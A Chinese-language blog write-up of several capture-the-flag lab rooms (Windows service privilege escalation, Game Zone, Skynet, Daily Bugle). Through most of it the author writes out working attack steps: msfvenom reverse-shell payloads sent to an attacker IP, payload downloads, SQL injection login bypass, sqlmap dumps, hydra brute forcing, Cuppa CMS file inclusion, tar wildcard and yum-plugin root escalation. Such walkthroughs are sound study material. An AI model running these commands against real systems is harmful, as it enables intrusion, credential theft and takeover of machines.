<p><img src="image-20240406122358633.png" alt="image-20240406122358633"></p>
<h2 id="权限提升-4">权限提升</h2>
<p>在此任务中，我们将了解 Windows 权限提升的基础知识。</p>
<p>首先，我们将从 netcat 转向 meterpreter 会话，并使用它来枚举机器以识别潜在的漏洞。然后，我们将使用收集到的信息来利用该系统并成为管理员。</p>
<p>上一小节建立的netcat 会话有点不稳定，我们可以使用 msfvenom 来建立一个新的反向shell。我们可以将普通shell升级为 meterpreter会话，此处需要使用 metasploit 来设置一个监听器。</p>
<p>首先，启动一个终端，运行metasploit并启动一个监听器。——老生常谈了</p>
<p><img src="image-20240406122725814.png" alt="image-20240406122725814"></p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.81.232 LPORT=5555 -e x86/shikata_ga_nai -f exe -o shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20240406123016084.png" alt="image-20240406123016084"></p>
<p>接着开启http服务，上传文件到目标机上</p>
<p>使用上一小节中所建立的shell界面拉取本地机中的exe文件到目标机上并执行该exe文件。</p>
<p>tips：</p>
<ul>
<li>我们通常会发现目标系统的C:\Windows\Temp是全局可写的！我们可以利用这一点在目标机上操作–拉取本地机中的文件到目标系统上并尝试执行这些文件。</li>
<li>例子（前提是在本地机启动http服务器）：powershell -c “Invoke-WebRequest -Uri ‘ip/shell.exe’ -OutFile ‘C:\Windows\Temp\shell.exe’”</li>
<li>使用 .\filename.exe 在目标机上执行这些文件。</li>
</ul>
<p><img src="image-20240406123155367.png" alt="image-20240406123155367"></p>
<p><img src="image-20240406123151741.png" alt="image-20240406123151741"></p>
<p><img src="image-20240406123254699.png" alt="image-20240406123254699"></p>
<p><img src="image-20240406123302658.png" alt="image-20240406123302658"></p>
<p>sysinfo查看目标系统版本信息</p>
<p><img src="image-20240406123439307.png" alt="image-20240406123439307"></p>
<p>在此处：我们可以使用一个名为 WinPEAS 的工具。 WinPEAS 是一个脚本，它可以在 Windows 机器上找到可能会被攻击者利用的路径和服务。</p>
<p>脚本地址：<a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe">https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe</a></p>
<p>上传WinPEAS脚本文件到目标机（方法和之前类似，此处使用第三小节中建立的的普通shell界面进行上传，也可以使用刚才建立的meterpreter 会话进行上传）</p>
<p><img src="image-20240406124047059.png" alt="image-20240406124047059"></p>
<p><img src="image-20240406124340761.png" alt="image-20240406124340761"></p>
<p>异常服务就是上述的红色框中的，这里是看不出来运行的exe文件的，还需要进入systemscheduler目录下看看</p>
<p><img src="image-20240406124846406.png" alt="image-20240406124846406"></p>
<p>如上图看到了众多的exe文件，但我们要找的是该服务会去运行的程序，因此需要进入Events事件查看器看一下该服务的运行日志</p>
<p><img src="image-20240406124946192.png" alt="image-20240406124946192"></p>
<p>可以看到运行的程序文件为Message.exe，接下来就是使用该程序提升权限</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.81.232 LPORT=5555 -e x86/shikata_ga_nai -f exe -o Message.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20240406125323425.png" alt="image-20240406125323425"></p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">copy Message.exe <span class="token string">"C:\Program Files (x86)\SystemScheduler\Message.exe"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20240406125819238.png" alt="image-20240406125819238"></p>
<p>这样便成功覆盖上述正常exe文件，之后直接run运行监听模块即可，因为该服务会持续运行Message.exe</p>
<p><img src="image-20240406125936613.png" alt="image-20240406125936613"></p>
<p>发现成功为管理员身份</p>
<p><img src="image-20240406130040591.png" alt="image-20240406130040591"></p>
<p><img src="image-20240406130212894.png" alt="image-20240406130212894"></p>
<p><img src="image-20240406130225685.png" alt="image-20240406130225685"></p>
<h2 id="没有-Metasploit-的权限升级">没有 Metasploit 的权限升级</h2>
<p>在这个任务中，我们将在不使用 meterpreter/metasploit 的情况下升级我们的权限！</p>
<p>首先，我们将从我们已经建立的 netcat 会话转向更稳定的反向 shell。一旦我们确定了这一点，我们将使用winPEAS来枚举系统的潜在漏洞，然后再使用此信息上报给管理员。</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">msfvenom -p windows/shell_reverse_tcp LHOST=10.11.81.232 LPORT=8888 -e x86/shikata_ga_nai -f exe -o shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">powershell -c wget <span class="token string">"http://10.11.81.232:81/reverse.exe"</span> -outfile reverse.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20240406131437100.png" alt="image-20240406131437100"></p>
<p>最终成功拿到</p>
<p><img src="image-20240406131509575.png" alt="image-20240406131509575"></p>
<h2 id="总结-6">总结</h2>
<p>这里依旧是针对web站点的漏洞，首先测试发现存在可以暴力破解的html表单，使用hydra破解之后，发现该站点的组件存在漏洞，利用漏洞利用描述方法，nc监听拿到shell，之后就转换为meterpreter shell（老生常谈了，不赘述）然后上传winPEAS.exe发现存在服务配置缺陷，不过这里还有点东西的，因为你可以看到该服务目录下存在多个exe，无法判断该服务运行的是谁，因此需要到events，看一下该服务的运行日志发现了其运行exe，之后就明确了。</p>
<h1>0x07 Game Zone挑战</h1>
<p>本会议室将介绍 SQLi（手动和通过 SQLMap 利用此漏洞）、破解用户哈希密码、使用 SSH 隧道揭示隐藏服务以及使用 metasploit 有效负载获得 root 权限。</p>
<p>这里反向图片识别，发现该图片的人物名字为agent 47</p>
<p><img src="image-20240407112224764.png" alt="image-20240407112224764"></p>
<h2 id="通过SQLi获取访问权限">通过SQLi获取访问权限</h2>
<p>在本小节中，你将更多地了解 SQL（结构化查询语言）以及如何潜在地操纵查询语句以便与数据库进行通信。</p>
<p>SQL 是一种标准语言，用于在数据库中存储、编辑和检索数据。 SQL查询语句可能如下所示：</p>
<p><strong>SELECT  FROM users WHERE username = ‘username’ AND password = ‘password’</strong></p>
<p>在目标靶机后台，当你尝试登录目标站点时，它会从登录页的用户名输入框和密码输入框中获取你所输入的值，然后将这些值直接插入到上面的查询语句中。 如果该查询语句找到有效数据得以匹配，你将被允许登录目标站点，否则将在登录页面上显示一条错误消息提示。</p>
<p>这是一个潜在的漏洞位置（登录框），因为你可以输入你所构造的用户名–将用户名构造为SQL 查询语句，这将写入、拼接并执行查询操作。</p>
<p>我们可以使用在上面学到的知识，在没有任何合法凭据的情况下操纵查询语句并实现登录行为。如果我们输入用户名 admin，输入密码<code>' or 1=1 #</code> 它会将密码中的值插入到后端查询语句中并验证我们的会话是否有效。</p>
<p>现在在 Web 服务器上执行的具体 SQL 查询如下：</p>
<p><strong>SELECT * FROM users WHERE username = ‘admin’ AND password =’ ’ or 1=1 # ’</strong></p>
<p>我们作为密码输入的额外SQL语句（<code>' or 1=1 #</code>）将会更改目标后端的初始查询为上述语句，这将中断初始查询过程并在 <strong>1==1</strong> 时继续（此时是管理员用户身份），然后我们将注释该查询的后接部分（使用**–**符号进行注释）以阻止SQL查询中断。</p>
<p>即使目标靶机的数据库中没有管理员用户，你仍然可以使用我们在上面所提到的值（<code>' or 1=1 #</code>）在不知道任何凭据的情况下完成登录。在登录页面，我们可以使用<code>' or 1=1 #</code>作为登录的用户名并将密码框一栏直接留空。</p>
<p>这里我在用户名的地方输入’ or 1=1 #，成功跳转</p>
<p><img src="image-20240407113532899.png" alt="image-20240407113532899"></p>
<p><img src="image-20240407114158478.png" alt="image-20240407114158478"></p>
<h2 id="使用SQLmap">使用SQLmap</h2>
<p>SQLMap 是一种流行的开源自动 SQL 注入和数据库接管工具，它预装在所有版本的 Kali Linux 上，当然你也可以手动下载和安装SQLMap工具。</p>
<p>在web安全领域有许多不同类型的 SQL 注入（比如基于布尔的注入、基于时间的注入等），而SQLMap 工具将尝试使用不同的技术自动化整个注入过程。</p>
<p>我们将使用 SQLMap 针对目标靶机转储它的整个数据库–使用我们之前登录的页面，我们将 SQLMap 指向目标站点的评论搜索功能。</p>
<p>首先，我们需要使用 BurpSuite 拦截对目标站点的搜索功能的请求。</p>
<p><img src="image-20240407114558876.png" alt="image-20240407114558876"></p>
<p>接着将上述内容cv到一个文件夹中，然后我们再将其传递给 SQLMap工具 以使用我们已经经过身份验证的用户会话。</p>
<p><img src="image-20240407114619086.png" alt="image-20240407114619086"></p>
<blockquote>
<p>sqlmap -r request.txt --dbms=mysql --dump</p>
</blockquote>
<p><strong>-r</strong> 读取之前已保存的burpsuite所拦截的请求信息<br>
<strong>–dbms</strong> 告诉 SQLMap 目标是什么类型的数据库管理系统<br>
<strong>–dump</strong> 尝试转储整个数据库数据（真实环境下请谨慎使用dump参数）</p>
<p>输入以上命令之后，将在终端启动SQLMap 并尝试使用不同的注入方法以验证一些易受攻击的漏洞，最终，它将会输出目标数据库中的数据信息到终端界面。</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">POST /portal.php HTTP/1.1
<span class="token property">Host</span><span class="token punctuation">:</span> 10.10.63.45
<span class="token property">User-Agent</span><span class="token punctuation">:</span> Mozilla/5.0 <span class="token punctuation">(</span>X11<span class="token punctuation">;</span> Linux x86_64<span class="token punctuation">;</span> <span class="token property">rv</span><span class="token punctuation">:</span>109.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/115.0
<span class="token property">Accept</span><span class="token punctuation">:</span> text/html<span class="token punctuation">,</span>application/xhtml+xml<span class="token punctuation">,</span>application/xml<span class="token punctuation">;</span>q=0.9<span class="token punctuation">,</span>image/avif<span class="token punctuation">,</span>image/webp<span class="token punctuation">,</span>*/*<span class="token punctuation">;</span>q=0.8
<span class="token property">Accept-Language</span><span class="token punctuation">:</span> en-US<span class="token punctuation">,</span>en<span class="token punctuation">;</span>q=0.5
<span class="token property">Accept-Encoding</span><span class="token punctuation">:</span> gzip<span class="token punctuation">,</span> deflate<span class="token punctuation">,</span> br
<span class="token property">Content-Type</span><span class="token punctuation">:</span> application/x-www-form-urlencoded
<span class="token property">Content-Length</span><span class="token punctuation">:</span> 15
<span class="token property">Origin</span><span class="token punctuation">:</span> <span class="token property">http</span><span class="token punctuation">:</span><span class="token comment">//10.10.63.45</span>
<span class="token property">Connection</span><span class="token punctuation">:</span> close
<span class="token property">Referer</span><span class="token punctuation">:</span> <span class="token property">http</span><span class="token punctuation">:</span><span class="token comment">//10.10.63.45/portal.php</span>
<span class="token property">Cookie</span><span class="token punctuation">:</span> PHPSESSID=2ggt1pm0albmt14khadge49ne0
<span class="token property">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> 1

searchitem=test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="image-20240407121526811.png" alt="image-20240407121526811"></p>
<p>这里还是重换了一个靶机，刚开始的扫不出来漏洞。。。这里发现密码可以直接爆破出来</p>
<p><img src="image-20240407121721299.png" alt="image-20240407121721299"></p>
<p><img src="image-20240407121758514.png" alt="image-20240407121758514"></p>
<h2 id="使用-JohnTheRipper-破解密码">使用 JohnTheRipper 破解密码</h2>
<p>我们需要学会使用工具来装13</p>
<p>开膛手约翰 (JTR) 是一种快速、免费且开源的密码破解程序，这个工具预装在所有 Kali Linux 机器上。我们将使用JTR程序来破解我们之前获得的哈希密码值， JohnTheRipper 已有 15 年历史，当然还有一些其他密码破解程序例如 HashCat等。</p>
<p>JohnTheRipper程序的工作原理是先获取一个密码单词表，然后用指定的hash算法对其进行散列处理，再将其与目标散列密码（hash密码值）进行比较，如果两个散列密码相同，则表示已找到目标散列密码所对应的明文密码–即破解成功。因为我们不能直接反转目标散列值来得到明文密码，所以我们需要通过比较散列值来完成对目标hash值的猜解过程。</p>
<p>在本地攻击机上安装 JohnTheRipper 后，你可以使用以下参数针对目标哈希进行破解：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=Raw-SHA256<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<blockquote>
<p>–wordlist - 是你用来破解目标哈希值的密码单词列表</p>
<p>hash.txt - 包含目标哈希值的列表（在一般情况下它的内容只是 1 个哈希值）</p>
<p>–format - 指明将要使用的散列算法类型，在上面的命令中，它表示使用 SHA256 算法进行哈希处理。</p>
</blockquote>
<p><img src="image-20240407122235877.png" alt="image-20240407122235877"></p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">ssh agent47@10.10.63.45<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20240407122431044.png" alt="image-20240407122431044"></p>
<p><img src="image-20240407122441796.png" alt="image-20240407122441796"></p>
<h2 id="使用反向-SSH-隧道暴露目标隐藏服务">使用反向 SSH 隧道暴露目标隐藏服务</h2>
<p><img src="image-20240407122529757.png" alt="image-20240407122529757"></p>
<p>反向 SSH 端口转发能够 指定将远程服务器主机上的给定端口转发到本地端的给定主机和端口。</p>
<blockquote>
<p>-L 是本地隧道 (YOU &lt;-- CLIENT 由远程客户端到你的本地机)。 如果某个站点被阻止，你可以将流量转发到你所拥有的服务器上并查看它。</p>
<p>例如，如果站点imgur在工作中被阻止，你可以执行 <code>ssh -L 9000:imgur.com:80 user@example.com</code>，然后在你的本地机器上访问 <code>localhost:9000</code>，这将使用你所拥有的其他服务器加载站点imgur的流量。</p>
<p>-R 是远程隧道（YOU --&gt; CLIENT 由你的本地机到远程客户端）。 这意味着你将流量转发到另一台服务器以供其他人查看，该过程与上面的本地隧道示例类似，但加载流量的结果相反。</p>
</blockquote>
<p>我们将使用一个名为 ss 的工具来调查主机上所运行的套接字（socket ），如果我们运行命令 <code>ss -tulpn</code> 它将告诉我们主机上正在运行哪些套接字（socket ）连接。</p>
<p><img src="image-20240407122813562.png" alt="image-20240407122813562"></p>
<p><img src="image-20240407122825272.png" alt="image-20240407122825272"></p>
<p><img src="image-20240407123154394.png" alt="image-20240407123154394"></p>
<p>接着我们访问本地10000端口即可</p>
<p><img src="image-20240407123251186.png" alt="image-20240407123251186"></p>
<p>这里利用agent47用户密码登录即可查看</p>
<p><img src="image-20240407123744679.png" alt="image-20240407123744679"></p>
<p><img src="image-20240407123725264.png" alt="image-20240407123725264"></p>
<h2 id="提升权限到root">提升权限到root</h2>
<p>根据CMS版本，使用 Metasploit 搜索能够针对目标机器执行的有效负载 即payload。</p>
<p>启动msf，搜索可用模块。</p>
<p><img src="image-20240407124147846.png" alt="image-20240407124147846"></p>
<p>设置参数并执行payload。</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">set PAYLOAD payload/cmd/unix/reverse
options
set USERNAME agent47
set PASSWORD videogamer124
set RHOSTS 127.0.0.1
set LHOST 10.13.16.58 #攻击机所使用的连接至TryHackMe平台的内部vpn ip地址
set SSL <span class="token boolean">false</span>
exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>/root/root.txt下</p>
<p><img src="image-20240407130611186.png" alt="image-20240407130611186"></p>
<h2 id="总结-7">总结</h2>
<p>针对web站点的登录框功能，采用了sql注入的万能密码，也是成功进入，之后针对其中的数据查询功能，采用SQLmap判断其中是否存在sql注入（post注入），最后dump出了用户名和密码，采用john工具解密出了密码，然后ssh远程登录。</p>
<p>随后ss -tulpn看到当前tcp套字连接情况，随后看到10000端口不出网，尝试ssh本地端口转发，使得我们可以从本地访问该端口，成功访问之后，采用用户名密码登录进去，发现存在webmin cms漏洞，接着就是常规msf  exploit的利用。</p>
<h1>0x08 Skynet挑战</h1>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">nmap -T5 -sC -sV -p- 10.10.187.5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20240412160321361.png" alt="image-20240412160321361"></p>
<p>这里看到139与445端口的开放，尝试枚举一下smb看一下共享的文件有哪些（这里无密码即可）</p>
<pre class="line-numbers language-none"><code class="language-none">smbclient -L \\10.10.187.5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20240412170044530.png" alt="image-20240412170044530"></p>
<p>看到匿名用户anonymous文件夹，继续访问看一下该文件夹下存在什么</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">smbclient <span class="token comment">//10.10.187.5/anonymous</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20240412171413067.png" alt="image-20240412171413067"></p>
<p><img src="image-20240412171827458.png" alt="image-20240412171827458"></p>
<p>之后进入logs查看日志文件，发现log2.txt含有相关密码信息</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里没思路了，看了wp是去找web站点的可疑点了，gobuster扫目录，发现squirrelmail可疑目录</p>
<p><img src="image-20240412180741192.png" alt="image-20240412180741192"></p>
<p><img src="image-20240412180110988.png" alt="image-20240412180110988"></p>
<p>这里是个邮件登录系统，可以联想到之前的邮件用户名，使用hydra爆破一下看看</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">hydra -l milesdyson -P log1.txt 10.10.187.5 http-form-post <span class="token string">"/squirrelmail/src/redirect.php:login_username=milesdyson&amp;secretkey=^PASS^&amp;js_autodetect_results=1&amp;just_logged_in=1:Unknown user or password incorrect"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20240412180831419.png" alt="image-20240412180831419"></p>
<p>成功得到密码<code>milesdyson:cyborg007haloterminator</code></p>
<p><img src="image-20240412181143021.png" alt="image-20240412181143021"></p>
<p>登录进去之后看到了smb密码重置，里面是当前smb服务密码：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token punctuation">)</span>s<span class="token punctuation">{</span>A&amp;2Z=F^n_E.B`<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20240412181214938.png" alt="image-20240412181214938"></p>
<p>这里联想到登录前面的smb共享账户milesdyson</p>
<p><img src="image-20240412181653781.png" alt="image-20240412181653781"></p>
<p><img src="image-20240412181625356.png" alt="image-20240412181625356"></p>
<p>可以找到该账户notes备忘录中的信息，发现这里添加了个CMS，我们访问看看</p>
<p><img src="image-20240412182141384.png" alt="image-20240412182141384"></p>
<p>尝试在二级目录下继续扫描敏感目录</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">dirsearch -u <span class="token string">"http://10.10.187.5/45kra24zxs28v3yd/"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20240412182213649.png" alt="image-20240412182213649"></p>
<p><img src="image-20240412182118384.png" alt="image-20240412182118384"></p>
<p>访问得到Cuppa CMS</p>
<p><img src="image-20240412185733142.png" alt="image-20240412185733142"></p>
<p>漏洞库找到CMS漏洞， 发现存在远程文件包含，那直接包含我们构造的恶意shell文件（在我们的恶意服务器上）</p>
<p><img src="image-20240412185840653.png" alt="image-20240412185840653"></p>
<p><img src="image-20240412185814689.png" alt="image-20240412185814689"></p>
<p><img src="image-20240412183013045.png" alt="image-20240412183013045"></p>
<p>如上图，成功拿到shell，这以后得提权就不是常规思路了，我想到了suid，但是没办法利用，结果wp先是搞了一个稳定shell，看的计划任务，但就算我看到计划任务，也不知道如何利用（虽然想到修改，但是在那个shell下无法正常使用vim）</p>
<h2 id="Tar通配符漏洞提权">Tar通配符漏洞提权</h2>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">which python #验证目标机有无Python环境
python -c <span class="token string">"import pty ; pty.spawn('/bin/bash')"</span> #利用Python环境将当前shell切换为一个更稳定的shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="image-20240412183812906.png" alt="image-20240412183812906"></p>
<p>这里看到backup.sh存在计划任务，我们看其中写的什么</p>
<p><img src="image-20240412184025658.png" alt="image-20240412184025658"></p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">-rwxr-xr-x 1 root root      74 Sep 17  2019 backup.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<blockquote>
<p>由上图可知以下信息：</p>
<p>backups目录下有一个backup.sh文件，其内容和作用是–切换目录至/var/www/html 并将该目录下的所有内容归档为backup.tgz压缩文件，该tgz文件保存在backups目录下；</p>
<p>通过查看/etc/crontab即定时任务可知–刚才描述的backups目录下的backup.sh文件是一个定时任务，该.sh脚本每分钟都会以root身份执行。</p>
</blockquote>
<p>在查询 <a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFOBins</a> 网站后，我们发现通过<code>tar</code>命令可以利用一个名为<code>–checkpoint</code>的参数，该参数允许在每次归档 X 个文件时（X的默认值为10）显示“进度”消息， <code>–checkpoint</code>还可以与 <code>–checkpoint-action</code> 标志串联使用，<code>–checkpoint-action</code>标志允许在到达检查点（checkpoint）时以二进制或脚本的形式执行某些操作。</p>
<p>结合前述已知信息：由于backups目录下的backup.sh脚本中使用的通配符<code>* </code>将对 /var/www/html 目录中的所有文件和文件夹执行归档命令，因此我们可以通过在/var/www/html下添加 <code>–checkpoint=1</code> 文件（启用检查点功能）和 <code>–checkpoint-action=exec=xxx</code> 文件（指定要执行的操作，检查点值为1，每归档一个文件都执行指定操作），那么当 <code>tar</code> 处理到以上文件时，相关的文件名将会被有效地视为<code>tar</code>命令的参数–从而执行某些操作。</p>
<p>在/var/www/html目录下创建一个BASH脚本，该脚本的执行结果将创建一个实质为bash副本的 SUID 二进制文件，<a target="_blank" rel="noopener" href="http://xn--newroot-e73ku5cfzzg9amz7ct4r4kq3x5gcdrb.sh">我们将该脚本命名为newroot.sh</a>：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">echo <span class="token string">"cp /bin/bash /tmp/nroot &amp;&amp; chmod +s /tmp/nroot"</span> <span class="token operator">&gt;</span> newroot.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>继续在/var/www/html目录下执行命令创建以下两个文件，这两个文件的实际作用是以文件名作为 tar 命令行中的参数:</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">touch <span class="token string">"/var/www/html/--checkpoint=1"</span>
touch <span class="token string">"/var/www/html/--checkpoint-action=exec=sh newroot.sh"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="image-20240412184558948.png" alt="image-20240412184558948"></p>
<p>大约一分钟后，cron 计划作业（即backups目录下的backup.sh脚本）将会以root权限自动运行，从而能够成功创建一个SUID文件（/tmp/nroot），我们可以使用 <code>-p</code> 标志执行该SUID文件，这将允许以该文件的所有者身份（root）执行此二进制文件，进而可以根据此二进制文件的内容切换到root shell。</p>
<p><img src="image-20240412185217531.png" alt="image-20240412185217531"></p>
<p>最后得到root flag</p>
<p><img src="image-20240412185303621.png" alt="image-20240412185303621"></p>
<h2 id="总结-8">总结</h2>
<p>依旧常规nmap扫描，发现110的pop3邮件服务协议以及SMB的139和445端口的开放，于是尝试枚举SMB服务，发现存在匿名用户和mile用户两个共享文件夹，先访问匿名的看是否存在敏感信息结果发现了一些密码列表，由于路子断了，可以想到看看web站点是否有漏洞，扫目录发现存在邮件系统登录页面，于是借用上述密码列表，成功爆破出强口令。</p>
<p>登录进去之后就是找信息或者漏洞点了，结果发现SMB服务重置之后的密码，于是可以成功登录SMB服务了，登录mile用户之后又发现一些信息泄露，发现存在一个CMS站点，继续扫二级目录找到后台登录地址，接着发现存在Cuppa CMS远程文件包含漏洞，于是包含shell文件，反弹得到shell，接着用自带的Python建立一个稳定shell，接着尝试提权，发现常规思路无果，看到计划任务可疑，发现存在tar通配符漏洞提权，凭借参数 配合使用最终拿到root priv</p>
<h1>0x09 Daily Bugle</h1>
<p>通过 SQLi 入侵 Joomla CMS 帐户，练习破解哈希值并利用 yum 提升您的权限。</p>
<p><img src="image-20240426082505136.png" alt="image-20240426082505136"></p>
<h2 id="初始访问-3">初始访问</h2>
<p>常规nmap扫描</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">nmap -T4 -sC -sV -p- 10.10.35.116<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20240426082924306.png" alt="image-20240426082924306"></p>
<p>上图可以看到http-generator（这个可以说是识别当前web服务器指纹信息）写着joomla，那我们尝试搜一下相关利用</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">search joomla
use scanner/http/joomla_version
run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="image-20240426083249790.png" alt="image-20240426083249790"></p>
<p>可以看到得到版本等详细信息，这里没想到去网络漫游，搜寻相关漏洞，根据提示去搜索的</p>
<p>一个是在exploit漏洞库可以看到利用方法：这个用的是sqlmap，且需要设置很多参数。</p>
<p>但如果继续搜索就会发现如下项目，其中包含众多CMS的利用脚本，我们直接采用这个</p>
<p><a target="_blank" rel="noopener" href="https://github.com/XiphosResearch/exploits">https://github.com/XiphosResearch/exploits</a></p>
<h2 id="SQL注入">SQL注入</h2>
<p><img src="image-20240426085219701.png" alt="image-20240426085219701"></p>
<p>如上图，这里是脚本用法，可以看到它需要你写出目标IP，并且会为你dump出用户和session表</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">python2 joomblah.py <span class="token property">http</span><span class="token punctuation">:</span><span class="token comment">//10.10.35.116/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20240426085515253.png" alt="image-20240426085515253"></p>
<p>可以看到这里得到的表明，其中找到了一些用户名，这里我对于这个爆出来的数据理解错了，我以为user这里代表全都是用户名之类的，但当我看到wp的sqlmap结果，我悟了</p>
<p><img src="image-20240426085833598.png" alt="image-20240426085833598"></p>
<p>这完全就是一个表结构而已，因此我们需要爆破后面的hash密码为明文即可（根据提示，使用john）</p>
<h2 id="john暴力破解">john暴力破解</h2>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token variable">$2y</span><span class="token variable">$10</span><span class="token variable">$0veO</span>/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm<span class="token comment">//写到文件中即可</span>
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="image-20240426090951162.png" alt="image-20240426090951162"></p>
<p>成功得到密码</p>
<p>继续网络漫游，搜寻获取后台之后如何getshell的思路，成功找到</p>
<p><img src="image-20240426092745193.png" alt="image-20240426092745193"></p>
<p>上图位置，可以照着箭头找到，接着利用msf生成php shell，替换上述文件内容</p>
<p><img src="image-20240426093132372.png" alt="image-20240426093132372"></p>
<h2 id="msf获得shell">msf获得shell</h2>
<p>之后访问文件所在路径即可，同时msf开启监听（记得设置的payload类型一致）</p>
<p><img src="image-20240426093538101.png" alt="image-20240426093538101"></p>
<p><img src="image-20240426101003694.png" alt="image-20240426101003694"></p>
<p>拿到之后发现当前用户是apache，root和home的用户都无权访问，提权也找不到（这里我也是误区，以为提权必须找一些配置的错误，但wp告诉我，可以找相关配置文件，可能会泄露用户密码）</p>
<p><img src="image-20240426101109516.png" alt="image-20240426101109516"></p>
<h2 id="切换用户提权">切换用户提权</h2>
<p>如上图，这里的php文件，名字可疑，访问发现有数据库配置文件信息，其中包含密码，所以尝试该密码区切换用户之类的</p>
<p><img src="image-20240426101214339.png" alt="image-20240426101214339"></p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">su jjameson<span class="token comment">//输入密码即可</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20240426100927146.png" alt="image-20240426100927146"></p>
<p>最后拿到flag，接下来看root</p>
<h2 id="sudo-提权">sudo 提权</h2>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">TF=$<span class="token punctuation">(</span>mktemp -d<span class="token punctuation">)</span>
cat &gt;<span class="token variable">$TF</span>/x&lt;&lt;EOF
[main]
plugins=1
pluginpath=<span class="token variable">$TF</span>
pluginconfpath=<span class="token variable">$TF</span>
EOF

cat &gt;<span class="token variable">$TF</span>/y.conf&lt;&lt;EOF
[main]
enabled=1
EOF

cat &gt;<span class="token variable">$TF</span>/y.py&lt;&lt;EOF
import os
import yum
from yum.plugins import PluginYumExit<span class="token punctuation">,</span> TYPE_CORE<span class="token punctuation">,</span> TYPE_INTERACTIVE
requires_api_version=<span class="token string">'2.1'</span>
def init_<span class="token function">hook</span><span class="token punctuation">(</span>conduit<span class="token punctuation">)</span><span class="token punctuation">:</span>
  os.<span class="token function">execl</span><span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">,</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>
EOF

